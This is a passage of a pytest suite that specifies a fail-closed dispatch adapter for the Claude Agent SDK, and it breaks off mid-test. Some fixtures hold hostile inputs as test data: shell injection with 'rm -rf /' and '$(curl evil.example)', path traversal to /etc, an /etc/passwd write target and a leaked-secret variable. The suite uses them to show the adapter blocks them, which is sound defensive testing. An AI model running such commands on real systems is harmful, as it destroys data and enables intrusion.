"""[BEHAVIORAL] Fail-closed fake-SDK contract for the Claude Agent SDK dispatch adapter.

Spec: loop-team/runs/2026-07-17_claude-model-routing-pace/specs/claude_product_pilot.md
SPEC_SHA256 = 698d23284f4de930c84d66551cd5e11dab717ca14af19a02c7d8e6472a0058bf
(STALE-VALUE CORRECTION: this file originally pinned 7745e91e689f8091406ae5e703
7ef2c150cfc9bd298ac5a1513e94cdc197b61b -- the spec's bytes BEFORE its round-4
plan-check rewrite of Section 6.1. That value is no longer this spec file's real
sha256; it is corrected here and in the module constant below to the actual
current, reviewed spec bytes the Coder built against.)

No implementation exists yet at ``loop-team/runner/claude_agent_adapter.py``. This suite
is written test-first per spec Section 12 / Section 11 point 1 and is expected to fail
(collection error / ModuleNotFoundError) until the Coder delivers. Every process,
tool-scope, ledger, session, and transcript collaborator is injected here -- this suite
never imports or resolves the real ``claude-agent-sdk`` package (Section 11 point 1:
"Fake-SDK injection is explicit for tests; production imports the real claude-agent-sdk
package"), so a failure here proves a policy boundary in ``claude_agent_adapter.py``, not
an environment/installation detail. This mirrors ``test_codex_exec_adapter.py``'s own
fake-only, injectable-collaborator convention exactly.

ASSUMED PUBLIC CONTRACT (pinned by this suite for the not-yet-written Coder; the spec
itself names ``ClaudeAgentCompatibilityPreflight``, ``ClaudeAgentDispatchRequest``, and
``ClaudeAgentDispatchResult`` explicitly -- Section 11 point 1 -- everything else below is
this suite's mirror of ``codex_exec_adapter.py``'s own injectable-collaborator shape,
adapted to the Claude Agent SDK's event-stream instead of Codex CLI JSONL):

  ClaudeAgentAdapterBlockedError(RuntimeError)
      .code == "PILOT_ABORTED"; constructed as (message, observation); .observation
      retains a redacted evidence surface for every abort (mirrors CodexAdapterBlockedError).

  is_sha256 / canonical_bytes / canonical_hash / canonical_packet_hash /
  deterministic_tree_hash -- module-local canonical helpers (mirrors codex_exec_adapter.py
  owning its own copies rather than importing codex_subscription_pilot.py's).

  ACCEPTED_MODELS = ("claude-sonnet-5", "claude-opus-4-8", "claude-haiku-4-5",
                     "claude-fable-5")
  ACCEPTED_TOOL_SCOPES = ("read_only", "workspace_write")
  ACCEPTED_PROMPTED_EFFORTS = frozenset({"low", "high"})

  resolve_current_usd_rate(model, *, rate_lookup, clock, max_age_seconds=86400) -> dict
      Raises ClaudeAgentAdapterBlockedError on an unresolvable, failed, or stale lookup
      (Section 4.3); returns {"model", "input_usd_per_mtok", "output_usd_per_mtok",
      "checked_at", "source"} on success.

  ClaudeAgentDispatchRequest (frozen dataclass): prompt, clone_path, artifact_dir,
      requested_model, tool_scope, effort_control, requested_effort, prompted_effort,
      timeout_seconds, approval_hash, manifest_hash, protected_roots, frozen_packet.

  ClaudeAgentDispatchResult (frozen dataclass): provider_result, usage_v1,
      raw_observation, cleanup_receipt, final_output, report_surface.

  ClaudeAgentCompatibilityPreflight(*, query_fn=None, rate_lookup=None, clock=None,
                                    test_mode=False, artifact_dir=None)
      .MATRIX -- the full (model x tool_scope) cross product (8 combinations)
      .run(*, cwd=None) -> receipt dict {"status": "PASS"|"PRECHECK_FAILED",
          "effort_control": "api_enforced"|"prompted_proxy", "checks": [...],
          "transcript_writes_parseable": bool, "data_retention_ok_fable5": bool,
          "tool_scope_mechanism_confirmed": bool, "failure_code": ...}

  ClaudeAgentAdapter(*, query_fn, ledger, tool_scope_prover, session_auditor=None,
                     transcript_reader=None, rate_lookup=None, clock=None,
                     redaction_patterns=None, test_mode=False)
      .execute(request: ClaudeAgentDispatchRequest) -> ClaudeAgentDispatchResult
      Raises ClaudeAgentAdapterBlockedError on any policy violation; never raises a bare
      exception class from elsewhere without wrapping it, mirroring CodexExecAdapter.
"""
from __future__ import annotations

import copy
import hashlib
import importlib
import json
import sys
import uuid
from dataclasses import replace
from pathlib import Path
from typing import Any, Dict, List, Optional

import pytest


LOOP_TEAM_DIR = Path(__file__).resolve().parents[2]
if str(LOOP_TEAM_DIR) not in sys.path:
    sys.path.insert(0, str(LOOP_TEAM_DIR))


SPEC_SHA256 = "698d23284f4de930c84d66551cd5e11dab717ca14af19a02c7d8e6472a0058bf"
ACCEPTED_MODELS = (
    "claude-sonnet-5", "claude-opus-4-8", "claude-haiku-4-5", "claude-fable-5",
)
ACCEPTED_TOOL_SCOPES = ("read_only", "workspace_write")
PROMOTION_BOUNDARY = "PILOT_ONLY/NO_ROUTING_PROMOTION"


def _api():
    return importlib.import_module("runner.claude_agent_adapter")


# --------------------------------------------------------------------------- fakes ----

class FakeLedger:
    """Scripted cap-reservation collaborator; mirrors codex_exec_adapter.py's injected
    ``ledger`` (reserve/start/reconcile) so exhaustion is provable without a real sqlite
    ledger implementation."""

    def __init__(self, *, reserve_error: Optional[Exception] = None,
                 reconcile_error: Optional[Exception] = None):
        self.reserve_error = reserve_error
        self.reconcile_error = reconcile_error
        self.reserve_calls: List[Any] = []
        self.start_calls: List[Any] = []
        self.reconcile_calls: List[Any] = []

    def reserve(self, key, requested):
        self.reserve_calls.append((key, dict(requested)))
        if self.reserve_error is not None:
            raise self.reserve_error
        return {"reservation_id": "claude-pilot-reservation-1", "state": "RESERVED"}

    def start(self, reservation_id):
        self.start_calls.append(reservation_id)
        return {"state": "NETWORK_IN_FLIGHT"}

    def reconcile(self, reservation_id, observation_id, actual):
        self.reconcile_calls.append((reservation_id, observation_id, dict(actual)))
        if self.reconcile_error is not None:
            raise self.reconcile_error
        return {"state": "RECONCILED"}


class FakeToolScopeProver:
    """Scripted tool-restriction/permissions-option evidence collaborator; plays the
    role ``TrustedProductionContainment``/``containment_probe`` plays for Codex, adapted
    to the Claude Agent SDK's own permissions option instead of a Seatbelt receipt."""

    def __init__(self, *, receipt_overrides: Optional[Dict[str, Any]] = None,
                 raise_on_probe: Optional[Exception] = None):
        self.receipt_overrides = receipt_overrides or {}
        self.raise_on_probe = raise_on_probe
        self.calls: List[Dict[str, Any]] = []

    def probe(self, **kwargs):
        self.calls.append(kwargs)
        if self.raise_on_probe is not None:
            raise self.raise_on_probe
        receipt = {
            "mechanism": "claude-agent-sdk-permissions",
            "version": "test-sdk-0.1.0",
            "sdk_enforced": True,
            "tool_scope": kwargs.get("tool_scope"),
            "policy_hash": hashlib.sha256(
                json.dumps(kwargs, sort_keys=True, default=str).encode("utf-8")
            ).hexdigest(),
            "writable_roots": list(kwargs.get("writable_roots", [])),
            "violations": [],
        }
        receipt.update(self.receipt_overrides)
        return receipt


class FakeSessionAuditor:
    """Scripted process/session-end confirmation collaborator; mirrors
    codex_exec_adapter.py's injected ``process_tree`` (signal_group/audit_empty/receipt)."""

    def __init__(self, *, confirmed: bool = True):
        self.confirmed = confirmed
        self.terminate_calls: List[str] = []
        self.confirm_calls: List[str] = []

    def terminate(self, session_id):
        self.terminate_calls.append(session_id)

    def confirm_ended(self, session_id):
        self.confirm_calls.append(session_id)
        return self.confirmed


class FakeSDKAPIError(Exception):
    """Scripted Messages-API error shape (status_code + error type), used only to
    prove the Fable-5 data-retention 400 is classified distinctly (Section 4.3)."""

    def __init__(self, status_code: int, error_type: str, message: str = "synthetic"):
        super().__init__(message)
        self.status_code = status_code
        self.error_type = error_type


def _result_event(*, session_id="sess-1", model="claude-sonnet-5", final_output="ok",
                   input_tokens=100, output_tokens=40, usage_extra=None,
                   effort_evidence=None, omit_usage=False, omit_model=False):
    event = {"type": "result", "session_id": session_id, "final_output": final_output}
    if not omit_model:
        event["configured_model"] = model
    if not omit_usage:
        usage = {"input_tokens": input_tokens, "output_tokens": output_tokens}
        if usage_extra:
            usage.update(usage_extra)
        event["usage"] = usage
    if effort_evidence is not None:
        event["effort_evidence"] = effort_evidence
    return event


def _transcript_records(*, model="claude-sonnet-5", input_tokens=100, output_tokens=40):
    """Mirrors the real observed transcript shape from spec Section 2.3:
    ``{"message": {"model": ..., "usage": {...}}}``."""
    return [
        {"message": {"model": model, "usage": {
            "input_tokens": input_tokens, "output_tokens": output_tokens,
        }}},
    ]


def make_query_fn(events, *, capture: Optional[List[Any]] = None,
                   raise_error: Optional[Exception] = None,
                   raise_on_model: Optional[Dict[str, Exception]] = None):
    """Build a fake ``claude_agent_sdk.query``-shaped callable: ``(prompt, options) ->
    Iterable[dict]``. ``capture`` records every ``(prompt, options)`` call made."""

    def query_fn(prompt, options):
        if capture is not None:
            capture.append((prompt, copy.deepcopy(options)))
        if raise_on_model and options.get("model") in raise_on_model:
            raise raise_on_model[options["model"]]
        if raise_error is not None:
            raise raise_error
        return list(events)

    return query_fn


def _accepting_probe_query_fn(*, effort_accepted: bool = True):
    """Preflight-probe fake: echoes back whichever (model, tool_scope) it was asked to
    probe, accepting or rejecting an ``effort`` option per ``effort_accepted``."""

    def query_fn(prompt, options):
        if "effort" in options and not effort_accepted:
            raise TypeError("query() got an unexpected keyword argument 'effort'")
        events = [{"type": "tool_use", "tool_name": "Read", "cwd": options.get("cwd"),
                   "path": "probe.txt", "write_targets": []}] if options.get(
            "tool_scope") == "workspace_write" and options.get("_probe_write") else []
        events.append(_result_event(
            model=options["model"], final_output="PROBE_OK",
            effort_evidence={"effort": options["effort"]} if "effort" in options else None,
        ))
        return events

    return query_fn


# --------------------------------------------------------------------- packet/request --

CLONE_PATH_TOKEN = "<CLONE>"
ARTIFACT_PATH_TOKEN = "<ARTIFACT>"
REQUIRED_MATERIALS = ("prompt", "plan", "oracle", "test", "dependency", "preprobe")


def _materials_dict(prefix="m"):
    contents = {name: "%s-%s\n" % (prefix, name) for name in REQUIRED_MATERIALS}
    return {
        name: {
            "path": "/sealed/%s/%s" % (prefix, name),
            "sha256": hashlib.sha256(content.encode("utf-8")).hexdigest(),
            "content": content,
        }
        for name, content in contents.items()
    }


def _base_packet(tmp_path: Path, *, role="incumbent_coder", model="claude-sonnet-5",
                  tool_scope="workspace_write", effort_control="api_enforced",
                  ordinal=4, case_id="P1") -> Dict[str, Any]:
    clone_path = str(tmp_path / "clone")
    artifact_dir = str(tmp_path / "artifact")
    Path(clone_path).mkdir(parents=True, exist_ok=True)
    Path(artifact_dir).mkdir(parents=True, exist_ok=True)
    protected_root = str(tmp_path / "protected-canonical-repo")
    Path(protected_root).mkdir(parents=True, exist_ok=True)
    clone_tree_entries = [{"path": "baseline.txt", "sha256": hashlib.sha256(
        ("clone-%d" % ordinal).encode()).hexdigest()}]
    source_tree_entries = [{"path": "source.txt", "sha256": hashlib.sha256(
        ("source-%d" % ordinal).encode()).hexdigest()}]
    api = _api()
    clone_tree_hash = api.deterministic_tree_hash(clone_tree_entries)
    source_tree_hash = api.deterministic_tree_hash(source_tree_entries)
    allowed_write_targets = [] if tool_scope == "read_only" else [
        str(Path(clone_path) / "src" / "changed.ts"),
    ]
    packet: Dict[str, Any] = {
        "schema": "frozen_claude_packet.v1",
        "task_identity": {"ordinal": ordinal, "case_id": case_id, "role": role},
        "requested_model": model,
        "tool_scope": tool_scope,
        "effort_control": effort_control,
        "requested_effort": "high" if effort_control == "api_enforced" else None,
        "prompted_effort": "high" if effort_control == "prompted_proxy" else None,
        "cwd": clone_path,
        "artifact_root": artifact_dir,
        "writable_roots": [clone_path, artifact_dir],
        "protected_roots": [protected_root],
        "allowed_write_targets": allowed_write_targets,
        "environment": {"LANG": "C", "PATH": "/usr/bin:/bin"},
        "clone_tree_hash": clone_tree_hash,
        "reverified_clone_tree_hash": clone_tree_hash,
        "baseline_tree_hash": clone_tree_hash,
        "source_tree_hash": source_tree_hash,
        "source_root": protected_root,
        "clone_tree_entries": clone_tree_entries,
        "source_tree_entries": source_tree_entries,
        "sealed_materials": _materials_dict(prefix="p%d" % ordinal),
        "allowed_files": [m["path"] for m in _materials_dict(prefix="p%d" % ordinal).values()],
        "timeout_seconds": 1800,
        "packet_hash": "0" * 64,
        "reverified_packet_hash": "0" * 64,
    }
    packet["immutable_authority"] = {
        "schema": "user_confirmation.v1",
        "spec_sha256": SPEC_SHA256,
        "approval_hash": "a" * 64,
        "manifest_hash": "b" * 64,
        "packet_hash": "0" * 64,
        "caps": {"combined_calls": 10},
        "requested_model": model,
        "effort_control": effort_control,
        "promotion_boundary": PROMOTION_BOUNDARY,
        "confirmed": True,
    }
    digest = api.canonical_packet_hash(packet)
    packet["packet_hash"] = packet["reverified_packet_hash"] = digest
    packet["immutable_authority"]["packet_hash"] = digest
    return packet


def _request(tmp_path: Path, **packet_overrides) -> Any:
    api = _api()
    packet = _base_packet(tmp_path, **packet_overrides)
    return api.ClaudeAgentDispatchRequest(
        prompt="Implement the sealed repair.",
        clone_path=packet["cwd"],
        artifact_dir=packet["artifact_root"],
        requested_model=packet["requested_model"],
        tool_scope=packet["tool_scope"],
        effort_control=packet["effort_control"],
        requested_effort=packet["requested_effort"],
        prompted_effort=packet["prompted_effort"],
        timeout_seconds=packet["timeout_seconds"],
        approval_hash=packet["immutable_authority"]["approval_hash"],
        manifest_hash=packet["immutable_authority"]["manifest_hash"],
        protected_roots=packet["protected_roots"],
        frozen_packet=packet,
    )


def _adapter(*, query_fn, ledger=None, tool_scope_prover=None, session_auditor=None,
             transcript_reader=None, rate_lookup=None, clock=None, test_mode=True):
    api = _api()
    ledger = ledger if ledger is not None else FakeLedger()
    tool_scope_prover = tool_scope_prover if tool_scope_prover is not None else FakeToolScopeProver()
    session_auditor = session_auditor if session_auditor is not None else FakeSessionAuditor()
    transcript_reader = transcript_reader if transcript_reader is not None else (
        lambda session_id: _transcript_records())
    rate_lookup = rate_lookup if rate_lookup is not None else (
        lambda model: {"input_usd_per_mtok": 3.0, "output_usd_per_mtok": 15.0,
                        "source": "fake-rate-table"})
    clock = clock if clock is not None else (lambda: 1_753_000_000.0)
    return api.ClaudeAgentAdapter(
        query_fn=query_fn, ledger=ledger, tool_scope_prover=tool_scope_prover,
        session_auditor=session_auditor, transcript_reader=transcript_reader,
        rate_lookup=rate_lookup, clock=clock, test_mode=test_mode,
    )


def _happy_events(*, model="claude-sonnet-5", tool_scope="workspace_write",
                   clone_path="/clone", write_targets=None):
    events = []
    if tool_scope == "workspace_write":
        events.append({
            "type": "tool_use", "tool_name": "Edit", "cwd": clone_path,
            "write_targets": write_targets or [],
        })
    events.append(_result_event(model=model))
    return events


# =========================================================================== TESTS ====

# --- 1. Call-shape preservation with hostile prompt/model/path values -----------------

def test_hostile_model_string_outside_accepted_set_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12] A model value not in ACCEPTED_MODELS is rejected,
    never passed through to the SDK call. The packet is validly sealed for the hostile
    model value itself, so the sole invalid condition under test is the model value, not
    a coincidental hash mismatch."""
    api = _api()
    capture: List[Any] = []
    query_fn = make_query_fn([], capture=capture)
    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path, model="claude-sonnet-5; rm -rf / #")
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)
    assert capture == []


def test_hostile_prompt_bytes_pass_through_unmodified_no_shell_interpolation(tmp_path):
    """[BEHAVIORAL][S12] Prompt text with shell metacharacters/unicode/newlines is a
    direct function argument (never shell text) and must reach query() byte-for-byte."""
    hostile_prompt = (
        "Implement `$(curl evil.example)`; rm -rf / #\n"
        "unicode: ☃é中文\nquote:\" '\n"
    )
    capture: List[Any] = []
    query_fn = make_query_fn(_happy_events(), capture=capture)
    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path)
    request = replace(request, prompt=hostile_prompt)
    adapter.execute(request)
    assert capture[0][0] == hostile_prompt


def test_hostile_clone_path_traversal_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12] A cwd containing path traversal or escaping the
    sealed clone root is rejected before any SDK call, proving cwd binding is
    non-bypassable even though this is a direct SDK call with no shell parsing."""
    api = _api()
    capture: List[Any] = []
    query_fn = make_query_fn(_happy_events(), capture=capture)
    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path)
    hostile_cwd = request.clone_path + "/../../../etc"
    request = replace(request, clone_path=hostile_cwd)
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)
    assert capture == []


def test_hostile_allowed_write_target_escaping_roots_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12] A sealed allowed_write_target outside the clone
    or artifact root is rejected -- tool-scope/cwd binding is non-bypassable via the
    packet either."""
    api = _api()
    capture: List[Any] = []
    query_fn = make_query_fn(_happy_events(), capture=capture)
    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path)
    packet = dict(request.frozen_packet)
    packet["allowed_write_targets"] = ["/etc/passwd"]
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet)
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)
    assert capture == []


# --- 2. Deterministic installed-SDK call-shape acceptance: 4 models x 2 tool-scopes ---

def test_preflight_matrix_covers_all_four_models_and_both_tool_scopes_traversal_complete(tmp_path):
    """[BEHAVIORAL][LOOP-M1][S12] The preflight must probe the FULL (model x tool_scope)
    cross product -- 4 models x 2 scopes = 8 -- never an early-exit subset."""
    api = _api()
    declared = {(model, scope) for model in api.ACCEPTED_MODELS
                for scope in api.ACCEPTED_TOOL_SCOPES}
    assert len(declared) == 8
    preflight = api.ClaudeAgentCompatibilityPreflight(
        query_fn=_accepting_probe_query_fn(), test_mode=True,
        artifact_dir=tmp_path / "preflight-artifacts",
    )
    receipt = preflight.run(cwd=str(tmp_path))
    actual = {(check["model"], check["tool_scope"]) for check in receipt["checks"]}
    assert actual == declared, "preflight matrix is not traversal-complete: %r" % (
        declared - actual)
    assert receipt["status"] == "PASS"


@pytest.mark.parametrize("model", ACCEPTED_MODELS)
@pytest.mark.parametrize("tool_scope", ACCEPTED_TOOL_SCOPES)
def test_preflight_records_call_shape_acceptance_for_each_model_and_scope(
        tmp_path, model, tool_scope):
    """[BEHAVIORAL][S12] Each of the four models is proven accepted under both tool-scope
    configurations individually (not inferred from one passing combination)."""
    preflight = _api().ClaudeAgentCompatibilityPreflight(
        query_fn=_accepting_probe_query_fn(), test_mode=True,
        artifact_dir=tmp_path / ("preflight-%s-%s" % (model, tool_scope)),
    )
    receipt = preflight.run(cwd=str(tmp_path))
    matching = [c for c in receipt["checks"] if c["model"] == model and c["tool_scope"] == tool_scope]
    assert len(matching) == 1
    assert matching[0]["call_shape_accepted"] is True


def test_preflight_records_precheck_failed_when_a_model_scope_combination_is_rejected(tmp_path):
    """[BEHAVIORAL][S12][S6.1] If any single (model, tool_scope) combination cannot be
    proven, the whole preflight is PRECHECK_FAILED -- never silently dropped."""
    def flaky_query_fn(prompt, options):
        if options["model"] == "claude-opus-4-8" and options["tool_scope"] == "read_only":
            raise RuntimeError("synthetic call-shape rejection")
        return _accepting_probe_query_fn()(prompt, options)

    preflight = _api().ClaudeAgentCompatibilityPreflight(
        query_fn=flaky_query_fn, test_mode=True, artifact_dir=tmp_path / "pf",
    )
    receipt = preflight.run(cwd=str(tmp_path))
    assert receipt["status"] == "PRECHECK_FAILED"
    assert receipt.get("failure_code")


# --- 3. Both effort_control outcomes, each exercised explicitly -----------------------

def test_preflight_records_api_enforced_when_native_effort_option_is_accepted(tmp_path):
    """[BEHAVIORAL][S2.2][S12] A native effort option accepted by the installed SDK is
    recorded as effort_control == "api_enforced"."""
    preflight = _api().ClaudeAgentCompatibilityPreflight(
        query_fn=_accepting_probe_query_fn(effort_accepted=True), test_mode=True,
        artifact_dir=tmp_path / "pf-effort-native",
    )
    receipt = preflight.run(cwd=str(tmp_path))
    assert receipt["effort_control"] == "api_enforced"


def test_preflight_records_prompted_proxy_when_no_native_effort_option_exists(tmp_path):
    """[BEHAVIORAL][S2.2][S12] No native effort option found is recorded as
    effort_control == "prompted_proxy", never left ambiguous."""
    preflight = _api().ClaudeAgentCompatibilityPreflight(
        query_fn=_accepting_probe_query_fn(effort_accepted=False), test_mode=True,
        artifact_dir=tmp_path / "pf-effort-proxy",
    )
    receipt = preflight.run(cwd=str(tmp_path))
    assert receipt["effort_control"] == "prompted_proxy"


def test_dispatch_uses_native_effort_option_and_records_requested_effort_field(tmp_path):
    """[BEHAVIORAL][S2.2][S12] Under api_enforced, the packet's requested_effort field is
    used and the native option is actually passed to query()."""
    capture: List[Any] = []
    query_fn = make_query_fn(_happy_events(), capture=capture)
    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path, effort_control="api_enforced")
    result = adapter.execute(request)
    _, options = capture[0]
    assert options.get("effort") == "high"
    assert result.report_surface["effort_control"] == "api_enforced"
    assert result.report_surface.get("prompted_effort") is None


def test_dispatch_uses_prompted_proxy_and_appends_exact_auditable_prompt_suffix(tmp_path):
    """[BEHAVIORAL][S2.2][S12] Under prompted_proxy, a prompted_effort instruction is
    appended byte-for-byte to the prompt (auditable), never a native option, and the
    report never claims a proven reasoning-depth difference -- only that the proxy
    instruction was issued."""
    capture: List[Any] = []
    query_fn = make_query_fn(_happy_events(), capture=capture)
    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path, effort_control="prompted_proxy")
    result = adapter.execute(request)
    sent_prompt, options = capture[0]
    assert "effort" not in options
    assert sent_prompt.startswith(request.prompt)
    assert "high" in sent_prompt[len(request.prompt):].lower()
    assert result.report_surface["effort_control"] == "prompted_proxy"
    assert result.report_surface.get("requested_effort") is None
    assert result.report_surface["effective_dispatch"]["prompted_effort_text"] in sent_prompt


def test_packet_can_never_carry_both_requested_effort_and_prompted_effort(tmp_path):
    """[BEHAVIORAL][S7] The two effort fields must not be conflated on the same packet."""
    api = _api()
    query_fn = make_query_fn(_happy_events())
    adapter = _adapter(query_fn=query_fn)
    request = _request(tmp_path, effort_control="api_enforced")
    packet = dict(request.frozen_packet)
    packet["prompted_effort"] = "high"  # both fields now present -- invalid
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet, prompted_effort="high")
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- 4. Usage extraction: SDK result object + independent transcript cross-check ------

def test_usage_extracted_from_sdk_result_object_when_transcript_agrees(tmp_path):
    """[BEHAVIORAL][S2.3][S12] Usage comes from the SDK result object, independently
    cross-checked against the transcript; agreement is required, never assumed."""
    events = _happy_events()
    query_fn = make_query_fn(events)
    reader = lambda session_id: _transcript_records(input_tokens=100, output_tokens=40)
    adapter = _adapter(query_fn=query_fn, transcript_reader=reader)
    request = _request(tmp_path)
    result = adapter.execute(request)
    assert result.usage_v1 is not None
    assert result.report_surface["observed_total_tokens"] == 140
    assert result.report_surface["usage_cross_check"] == "AGREED"


def test_usage_disagreement_between_sdk_result_and_transcript_aborts_never_prefers_one(tmp_path):
    """[BEHAVIORAL][S12][S2.3][S4.2] A material mismatch between the SDK result object's
    usage and the independently parsed transcript usage must abort -- never silently
    prefer one source."""
    events = _happy_events()  # SDK result reports input=100, output=40
    query_fn = make_query_fn(events)
    reader = lambda session_id: _transcript_records(input_tokens=9001, output_tokens=9001)
    adapter = _adapter(query_fn=query_fn, transcript_reader=reader)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError, match="disagree|cross-check|mismatch"):
        adapter.execute(request)


def test_missing_transcript_when_preflight_confirmed_one_exists_is_unknown_and_aborts(tmp_path):
    """[BEHAVIORAL][S2.3][S12] A transcript that fails to parse/locate is UNKNOWN, never
    treated as zero usage, and aborts the call."""
    events = _happy_events()
    query_fn = make_query_fn(events)
    reader = lambda session_id: (_ for _ in ()).throw(OSError("transcript unavailable"))
    adapter = _adapter(query_fn=query_fn, transcript_reader=reader)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- 5. Each TERMINAL event class + 6. unknown event ----------------------------------

@pytest.mark.parametrize("terminal_event,label", [
    ({"type": "tool_use", "tool_name": "Task", "input": {"prompt": "spawn a sub-agent"}},
     "sub_delegation"),
    ({"type": "tool_use", "tool_name": "mcp__filesystem__write_file", "input": {}},
     "remote_mcp_dispatch"),
    ({"type": "tool_use", "tool_name": "WebFetch", "input": {"url": "https://evil.example"}},
     "network_capable_tool"),
    ({"type": "permission_request", "action": "escalate_privilege"},
     "approval_escalation_privilege"),
    ({"type": "sandbox_change", "requested_mode": "workspace-write"},
     "sandbox_change"),
    ({"type": "never_seen_before_event"}, "unknown_event"),
])
def test_terminal_and_unknown_events_abort_the_dispatch(tmp_path, terminal_event, label):
    """[BEHAVIORAL][SECURITY-ORACLE][S12][S6.2] Every named TERMINAL class -- sub-delegation,
    remote MCP/tool dispatch, network-capable tool beyond the single API call,
    approval/escalation/privilege/sandbox change -- and an unknown event type each abort
    the call. This test is the mutation-oracle target: each event type in this table must
    independently flip the outcome to blocked."""
    request = _request(tmp_path)
    event = dict(terminal_event)
    event.setdefault("cwd", request.clone_path)
    events = [event, _result_event()]
    query_fn = make_query_fn(events)
    adapter = _adapter(query_fn=query_fn)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_allowed_local_tool_events_do_not_abort(tmp_path):
    """[BEHAVIORAL] Sanity check for the TERMINAL matrix above: a sealed local
    read/write/edit event inside the clone must NOT be classified terminal, or every
    real dispatch would abort spuriously."""
    request = _request(tmp_path)
    events = [
        {"type": "tool_use", "tool_name": "Read", "cwd": request.clone_path,
         "path": str(Path(request.clone_path) / "baseline.txt"), "write_targets": []},
        {"type": "tool_use", "tool_name": "Edit", "cwd": request.clone_path,
         "write_targets": request.frozen_packet["allowed_write_targets"]},
        _result_event(),
    ]
    query_fn = make_query_fn(events)
    adapter = _adapter(query_fn=query_fn)
    result = adapter.execute(request)
    assert result.final_output == "ok"


# --- 7. Frozen-packet policy/cwd/environment/root/allowed-write rejection -------------

def test_frozen_packet_cwd_mismatch_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12] request.clone_path must equal the sealed
    packet's cwd; any mismatch is rejected."""
    request = _request(tmp_path)
    request = replace(request, clone_path=request.clone_path + "-different")
    adapter = _adapter(query_fn=make_query_fn(_happy_events()))
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_frozen_packet_environment_mismatch_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12] The environment actually passed to query() must
    equal the sealed packet's minimal environment; a mismatch (e.g. an extra/leaked
    variable) is rejected."""
    api = _api()
    request = _request(tmp_path)
    packet = dict(request.frozen_packet)
    packet["environment"] = dict(packet["environment"], LEAKED_SECRET="sk-leak-me")
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet)

    adapter = _adapter(query_fn=make_query_fn(_happy_events()))
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_frozen_packet_writable_root_equal_to_protected_root_is_rejected(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12][S2.4] A writable root that is (or is inside) a
    canonical protected root -- e.g. the clone path pointed at the real product repo --
    is rejected before dispatch."""
    api = _api()
    request = _request(tmp_path)
    packet = dict(request.frozen_packet)
    protected = packet["protected_roots"][0]
    packet["writable_roots"] = [protected, packet["artifact_root"]]
    packet["cwd"] = protected
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet, clone_path=protected)
    adapter = _adapter(query_fn=make_query_fn(_happy_events()))
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


def test_frozen_packet_allowed_write_target_policy_rejection(tmp_path):
    """[BEHAVIORAL][SECURITY-ORACLE][S12] Sealed policy rejection: allowed_write_targets
    must subset the clone/artifact roots (covered distinctly from the dynamic
    out-of-scope WRITE SIGNAL test below, which catches a live tool-use event instead of
    a tampered static packet field)."""
    api = _api()
    request = _request(tmp_path)
    packet = dict(request.frozen_packet)
    packet["allowed_write_targets"] = [str(Path(packet["artifact_root"]).parent / "outside.txt")]
    packet["packet_hash"] = packet["reverified_packet_hash"] = api.canonical_packet_hash(packet)
    request = replace(request, frozen_packet=packet)
    adapter = _adapter(query_fn=make_query_fn(_happy_events()))
    with pytest.raises(api.ClaudeAgentAdapterBlockedError):
        adapter.execute(request)


# --- 8. Timeout handling + confirmed clean process/session end -----------------------

def test_timeout_aborts_and_still_confirms_clean_session_end(tmp_path):
    """[BEHAVIORAL][S12][S6.2] A timeout aborts the call, but the adapter must still
    terminate and CONFIRM the session ended cleanly before returning -- it cannot just
    give up."""
    class TimeoutQueryFn:
        def __call__(self, prompt, options):
            raise TimeoutError("synthetic 1800s timeout")

    auditor = FakeSessionAuditor(confirmed=True)
    adapter = _adapter(query_fn=TimeoutQueryFn(), session_auditor=auditor)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError, match="timeout|timed out"):
        adapter.execute(request)
    assert auditor.terminate_calls
    assert auditor.confirm_calls


def test_timeout_with_unconfirmed_session_end_is_a_precheck_gap_not_silently_accepted(tmp_path):
    """[BEHAVIORAL][S12][S6.2] If the session cannot be confirmed cleanly ended after a
    timeout, that must itself surface as a blocking condition, not a silent pass."""
    class TimeoutQueryFn:
        def __call__(self, prompt, options):
            raise TimeoutError("synthetic 1800s timeout")

    auditor = FakeSessionAuditor(confirmed=False)
    adapter = _adapter(query_fn=TimeoutQueryFn(), session_auditor=auditor)
    request = _request(tmp_path)
    with pytest.raises(_api().ClaudeAgentAdapterBlockedError):
        adapter.execute(request)
    assert auditor.confirm_calls


def test_normal_completion_confirms_clean_process_session_end_before_returning(tmp_path):
    """[BEHAVIORAL][S12][S6.2] Even a successful dispatch must confirm the session ended
    cleanly (no lingering background work) before the adapter returns."""
    auditor = FakeSessionAuditor(confirmed=True)
